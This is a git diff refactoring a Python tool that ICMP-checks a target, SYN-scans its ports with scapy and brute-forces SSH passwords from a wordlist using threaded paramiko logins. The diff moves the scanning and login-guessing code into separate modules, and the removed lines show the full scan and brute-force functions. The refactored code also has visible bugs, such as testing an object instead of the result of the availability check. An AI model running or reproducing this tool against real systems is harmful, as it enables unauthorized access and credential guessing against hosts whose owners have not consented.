@@ -1,8 +1,9 @@
-from scapy.all import *
-from scapy.layers.inet import IP, TCP, ICMP
 import paramiko, sys, os, termcolor
 import threading, time
 
+from hostchecker.TargetAvailability import TargetAvailability
+from scanport.PortScanner import PortScanner
+from sshcracker.ConnectSSH import ConnectSSH
 # Config
 timeout_half_sec = 0.5
 timeout_two_sec = 2
@@ -10,54 +11,18 @@ timeout_three_sec = 3
 TCP_SYN_FLAG = 'S'
 TCP_RST_FLAG = 'R'
 stop_flag = 0
+ssh_port = 22
 
 target = input("Please add target: ")
-registered_Ports = range(1,1023)
-# registered_Ports = range(1, 100)
+# registered_Ports = range(1, 1023)
+registered_Ports = range(15, 25)
 open_ports = []
 
+portscanner = PortScanner(target, timeout_half_sec, timeout_two_sec, TCP_RST_FLAG, TCP_SYN_FLAG)
+targetAvailability = TargetAvailability()
+connect_ssh = ConnectSSH(target, ssh_port, stop_flag)
 
-def scan_port(dst_port):
-    source_port = RandShort()
-    conf.verb = 0
-
-    pkt = IP(dst=target)/TCP(sport=source_port,dport=dst_port,flags=TCP_SYN_FLAG)
-    syn_pkt = sr1(pkt, timeout=timeout_half_sec)
-
-    if syn_pkt is None:
-        return False
-    elif not syn_pkt.haslayer(TCP):
-        return False
-    elif syn_pkt.haslayer(TCP):
-        var = syn_pkt[TCP].flags & 0x12 == 0x12
-        pkt = IP(dst=target)/TCP(sport=source_port,dport=dst_port,flags=TCP_RST_FLAG)
-        sr(pkt, timeout=timeout_two_sec)
-        return var
-
-
-def target_availability_check(scan_host):
-    try:
-        conf.verb = 0
-        pingr = IP(dst=scan_host) / ICMP()
-        res = sr1(pingr, timeout=timeout_three_sec)
-        if res is not None:
-            return True
-    except Exception as inst:
-        print(inst)
-        return False
-
-
-def ssh_connect(password, port_number):
-    global stop_flag
-    ssh_conn = paramiko.SSHClient()
-    ssh_conn.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        ssh_conn.connect(host, port=port_number, username=username, password=password)
-        stop_flag = 1
-        print(termcolor.colored(('[+] Success Password: ' + password + ', For Account: ' + username), 'green'))
-    except:
-        print(termcolor.colored(('[-] Nop Login: ' + password), 'red'))
-    ssh_conn.close()
+targetAvailability.check_host_availible(target,timeout_three_sec)
 
 
 def brut_force(port):
@@ -67,15 +32,15 @@ def brut_force(port):
                 t.join()
                 exit()
             password = line.strip()
-            t = threading.Thread(target=ssh_connect, args=(password, port))
+            t = threading.Thread(target=connect_ssh.ssh_connect, args=(password, username))
             t.start()
             time.sleep(1)
 
 
-if target_availability_check(target):
+if targetAvailability:
     print("Port scan start")
     for i in registered_Ports:
-        status = scan_port(i)
+        status = portscanner.scan_potrs(i)
         if status:
             print(f"Open port {i}")
             open_ports.append(i)
